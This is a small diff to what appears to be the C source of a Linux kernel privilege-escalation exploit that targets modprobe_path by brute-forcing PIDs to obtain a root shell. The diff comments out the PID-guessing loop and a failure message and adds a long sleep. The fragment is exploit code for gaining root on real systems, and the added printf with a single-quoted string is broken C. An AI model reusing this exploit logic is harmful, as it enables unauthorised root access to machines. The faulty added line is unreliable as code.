@@ -451,6 +451,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 				PRINTF_VERBOSE("[*] modprobe_script_fd: %d, status_fd: %d\n", modprobe_script_fd, status_fd);
 				
 				printf("[*] overwriting path with PIDs in range 0->4194304...\n");
+				/*
 				for (pid_t pid_guess=0; pid_guess < 4194304; pid_guess++)
 				{
 					int status_cnt;
@@ -484,9 +485,10 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 
 					return;
 				}
-
-				printf("[!] verified modprobe_path address does not work... CONFIG_STATIC_USERMODEHELPER enabled?\n");
-
+				*/
+				//printf("[!] verified modprobe_path address does not work... CONFIG_STATIC_USERMODEHELPER enabled?\n");
+				printf('execution finished, sleeping');
+				sleep(9999);
 				return;
 			}
 			
